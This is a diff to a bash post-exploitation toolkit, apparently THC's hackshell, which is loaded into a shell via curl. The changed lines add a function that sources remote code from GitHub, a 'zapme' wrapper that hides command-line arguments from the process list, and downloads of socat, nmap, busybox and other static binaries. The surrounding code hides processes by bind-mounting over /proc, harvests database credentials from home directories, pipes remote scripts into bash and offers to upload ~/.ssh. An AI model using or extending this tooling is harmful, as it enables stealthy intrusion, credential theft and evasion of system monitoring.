@@ -74,6 +74,7 @@ PS1='"'\[\\033[36m\]\\u\[\\033[m\]@\[\\033[32m\]\\h:\[\\033[33;1m\]\\w\[\\033[m\
 }
 
 burl() {
+    local proto x host query
     IFS=/ read -r proto x host query <<<"$1"
     exec 3<>"/dev/tcp/${host}/${PORT:-80}"
     echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
@@ -261,6 +262,10 @@ rdns () {
     curl -fsSL "https://lookup.segfault.net/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
 }
 
+ghostip() {
+    source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+}
+
 hide() {
     local _pid="${1:-$$}"
     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
@@ -271,26 +276,32 @@ hide() {
     bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
 }
 
-hs_mkhome() {
+_hs_xhome_init() {
+    [[ "$PATH" != *"$XHOME"* ]] && export PATH="${XHOME}:$PATH"
+}
+
+hs_mkxhome() {
+    _hs_xhome_init
     [ -d "${XHOME}" ] && return 255
     mkdir -p "${XHOME:?}" 2>/dev/null || return
     echo -e ">>> Using ${CDY}XHOME=${XHOME}${CN}. ${CF}[will auto-destruct on exit]${CN}"
     echo -e ">>> Type ${CDC}destruct${CN} to erase ${CDY}${XHOME}${CN}"
-    echo -e ">>> Type ${CDC}cdx${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
     echo -e ">>> Type ${CDC}keep${CN} to disable auto-destruct on exit."
-    # [[ "$PATH" == "$XHOME"* ]] || export PATH="${XHOME}:$PATH"
-    export PATH="${XHOME}:$PATH"
+    echo -e ">>> Type ${CDC}cdx${CN} to change to your hidden ${CDY}\"\${XHOME}\"${CN} directory"
 }
 
-cdx() { cd "${XHOME}"; }
+cdx() { cd "${XHOME}" || return; }
 
 # Keep this seperate because this actually creates data.
-mk() {
-    UHOME="${HOME}"
+xhome() {
     export HOME="${XHOME}"
     echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN}"
-    echo -e "Undo with ${CDC}export HOME='${_HS_HOME_ORIG}'${CN}"
-    hs_mkhome || return
+    hs_mkxhome
+    echo -e ">>> Type ${CDC}home${CN} to undo."
+}
+
+home() {
+    export HOME="${_HS_HOME_ORIG}"
 }
 
 keep() {
@@ -299,7 +310,11 @@ keep() {
 }
 
 np() {
-    command -v noseyparker >/dev/null || { HS_ERR "Not found: noseyparker. Type ${CDC}bin${CN} first."; return 255;}
+    command -v noseyparker >/dev/null || { HS_ERR "Not found: noseyparker. Type ${CDC}bin noseyparker${CDR} first."; return 255;}
+    [ -t 1 ] && {
+        HS_WARN "Use ${CDC}np $*| less -R${CN} instead."
+        return;
+    }
 	local d="/tmp/.np-${UID}-$$"
 	[ -d "${d}" ] && rm -rf "${d:?}"
 	[ $# -le 0 ] && set - .
@@ -308,28 +323,48 @@ np() {
 	rm -rf "${d:?}"
 }
 
+zapme() {
+    HS_WARN "Starting new/zapper SHELL. Type '${CDC} source <(curl -SsfL https://thc.org/hs)${CDM}' again."
+    exec zapper -f -a"${1:--}" bash -il
+}
+
 bin() {
     local arch="$(uname -m)"
     local os="$(uname -s)"
     local a
+    local single="${1}"
+    local is_showhelp=1
 
     [ -z "$os" ] && os="Linux"
     [ -z "$arch" ] && arch="x86_64"
+    [ -n "$single" ] && unset is_showhelp
+    a="${arch}"
 
-    a="${arch}-${os}"
-
-    hs_mkhome
+    hs_mkxhome
 
     bin_dl() {
         local dst="${XHOME}/${1:?}"
         local str="${CDM}Downloading ${CDC}${1:?}${CDM}........................................"
         local is_skip
+        [ -n "$single" ] && {
+            [ -n "$_HS_SINGLE_MATCH" ] && return # already tried to download
+            [ "$single" != "$1" ] && { unset _HS_SINGLE_MATCH; return; }
+            _HS_SINGLE_MATCH=1
+        }
         echo -en "${str:0:64}"
         [ -s "${dst}" ] || rm -f "${dst:?}" 2>/dev/null
         [ -z "$FORCE" ] && command -v "${1}" >/dev/null && is_skip=1
         [ -n "$FORCE" ] && [ -s "$dst" ] && is_skip=1
         [ -n "$is_skip" ] && { echo -e "[${CDY}SKIPPED${CDM}]${CN}"; return 0; }
-        { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${dst}" 3>&1 || { echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"; return 255; }
+        { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${dst}" 3>&1 || {
+            rm -f "${dst:?}" 2>/dev/null
+            if [ -z "$UNSAFE" ] && [[ "$err" == *"$_HS_SSL_ERR"* ]]; then
+                echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}\n---> Try ${CDC}export UNSAFE=1${CN}"
+            else
+                echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"
+            fi
+            return 255
+        }
         chmod 711 "${dst}"
         echo -e ".....[${CDG}OK${CDM}]${CN}"
     }
@@ -342,6 +377,7 @@ bin() {
     bin_dl anew      "https://bin.ajam.dev/${a}/anew"
     bin_dl ping      "https://bin.ajam.dev/${a}/ping"
     bin_dl nc        "https://bin.ajam.dev/${a}/ncat"
+    bin_dl socat     "https://bin.ajam.dev/${a}/socat"
     bin_dl jq        "https://bin.ajam.dev/${a}/jq"
     bin_dl netstat   "https://bin.ajam.dev/${a}/netstat"
     bin_dl rsync     "https://bin.ajam.dev/${a}/rsync"
@@ -354,15 +390,27 @@ bin() {
     bin_dl zgrep     "https://bin.ajam.dev/${a}/Baseutils/zgrep"
     bin_dl grep      "https://bin.ajam.dev/${a}/Baseutils/grep"
     bin_dl tar       "https://bin.ajam.dev/${a}/Baseutils/tar"
-    bin_dl sed       "https://bin.ajam.dev/${a}/Baseutils/secd"
+    bin_dl sed       "https://bin.ajam.dev/${a}/Baseutils/sed"
     bin_dl nmap      "https://bin.ajam.dev/${a}/nmap"
     bin_dl tcpdump   "https://bin.ajam.dev/${a}/tcpdump"
+    bin_dl openssl   "https://bin.ajam.dev/${a}/Baseutils/openssl/openssl"
+    bin_dl busybox   "https://bin.ajam.dev/${a}/Baseutils/busybox/busybox"
     [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
 
-    [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to force download even if systemwide exists" 
-    echo -e ">>> ${CW}TIP${CN}: Type ${CDC}exec zapper -f -a- bash -il${CN} to hide all command line
->>> options from the process list"
-    echo -e ">>> ${CDG}Download COMPLETE${CN}"
+    [ -n "$single" ] && [ -z "$_HS_SINGLE_MATCH" ] && {
+        local str="${single##*/}"
+        local loc="${single}"
+        unset single
+        bin_dl "${str}" "https://bin.ajam.dev/${a}/${loc}"
+    }
+    unset _HS_SINGLE_MATCH
+    [ -n "$is_showhelp" ] && {
+        [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to ignore systemwide binaries" 
+        echo -e ">>> Use ${CDC}bin <name>${CN} to download a specific binary"
+        echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line
+>>> options from your current shell and all further processes."
+        echo -e ">>> ${CDG}Download COMPLETE${CN}"
+    }
 
     unset -f bin_dl
 }
@@ -390,7 +438,7 @@ loot_bitrix() {
 }
 
 loot() {
-    local h="${UHOME:-$HOME}"
+    local h="${_HS_HOME_ORIG:-$HOME}"
     local str
 
     for fn in "${HOMEDIR:-/home}"/*/.my.cnf /root/.my.cnf; do
@@ -443,11 +491,16 @@ ws() {
     dl https://thc.org/ws | bash
 }
 
-destruct() {
+_hs_destruct() {
     [ -z "$XHOME" ] && return
     [ ! -d "$XHOME" ] && return
     echo -e ">>> Cleansing ${CDY}${XHOME}${CN}"
     rm -rf "${XHOME:?}"
+}
+
+destruct() {
+    _hs_destruct
+    export HOME="${_HS_HOME_ORIG}"
 }
 
 hs_exit() {
@@ -457,7 +510,7 @@ hs_exit() {
         if [ -f "${XHOME}/.keep" ]; then
             HS_WARN "Keeping ${CDY}${XHOME}${CN}"
         else
-            destruct
+            _hs_destruct
         fi
     }
     [ -t 1 ] && echo -e "${CW}>>>>> 📖 More tips at https://thc.lorg/tips${CN} 😘"
@@ -470,11 +523,21 @@ hs_exit() {
 hs_init_dl() {
     # Ignore TLS certificate. This is DANGEROUS but many hosts have missing ca-bundles or TLS-Proxies.
     if command -v curl >/dev/null; then
-        dl() { curl -fsSLk --proto-default https --connect-timeout 7 --retry 3 "${1:?}";}
+        _HS_SSL_ERR="certificate "
+        dl() { 
+            local opts=()
+            [ -n "$UNSAFE" ] && opts=("-k")
+            curl -fsSL "${opts[@]}" --proto-default https --connect-timeout 7 --retry 3 "${1:?}"
+        }
     elif command -v wget >/dev/null; then
-        dl() { wget -Op --no-check-certificate --connect-timeout=7 --dns-timeout=7 "${1:?}";}
+        _HS_SSL_ERR="is not trusted"
+        dl() {
+            local opts=()
+            [ -n "$UNSAFE" ] && opts=("--no-check-certificate")
+            wget -O- "${opts[@]}" --connect-timeout=7 --dns-timeout=7 "${1:?}"
+        }
     else
-        dl() { HS_ERR "Not found: curl"; }
+        dl() { HS_ERR "Not found: curl, wget"; }
     fi
 }
 
@@ -486,6 +549,10 @@ hs_init() {
     [ -z "$BASH" ] && { HS_WARN "Shell is not BASH. Try:
 ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chmod 700 bash && exec bash -il'"; sleep 2; }
     [ -n "$BASH" ] && [ "${prg##*\.}" = "sh" ] && { HS_ERR "Use ${CDC}source $prg${CDR} instead"; sleep 2; exit 255; }
+    [ -n "$BASH" ] && {
+        str="$(command -v bash)"
+        [ -n "$str" ] && SHELL="${str}"
+    }
     [ -z "$UID" ] && UID="$(id -u)"
     [ -n "$_HS_HOME_ORIG" ] && export HOME="$_HS_HOME_ORIG"
     export _HS_HOME_ORIG="$HOME"
@@ -534,7 +601,10 @@ hs_init_shell() {
     export TMPDIR
     [ -z "$XHOME" ] && export XHOME="${TMPDIR}/${T}"
 
-    export PATH=".:${PATH}"
+    [ "${PATH:0:2}" != ".:" ] && export PATH=".:${PATH}"
+    # Might already exist.
+    [ -d "$XHOME" ] && _hs_xhome_init
+
     # PS1='USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \e[36m\u\e[m@\e[32m\h:\e[33;1m\w \e[0;31m\$\e[m '
     if [[ "$SHELL" == *"zsh" ]]; then
         PS1='%F{red}%n%f@%F{cyan}%m %F{magenta}%~ %(?.%F{green}.%F{red})%#%f '
@@ -551,6 +621,7 @@ ${CDC} xsu username                          ${CDM}Switch user
 ${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. empty tmux list-s]
 ${CDC} xssh                                  ${CDM}Silently log in to remote host
 ${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
+${CDC} ghostip                               ${CDM}Originate from a non-existing IP
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
 ${CDC} transfer ~/.ssh                       ${CDM}Upload a file or directory ${CN}${CF}[${HS_TRANSFER_PROVIDER}]
 ${CDC} shred file                            ${CDM}Securely delete a file
@@ -578,7 +649,7 @@ xhelp
 ### Finishing
 str=""
 [ -z "$BIN" ] && {
-    echo -e ">>> Type ${CDC}mk${CN} to set HOME=${CDY}${XHOME}${CN}"
+    echo -e ">>> Type ${CDC}xhome${CN} to set HOME=${CDY}${XHOME}${CN}"
     str="No data was written to the filesystem"
 }
 echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN}]"
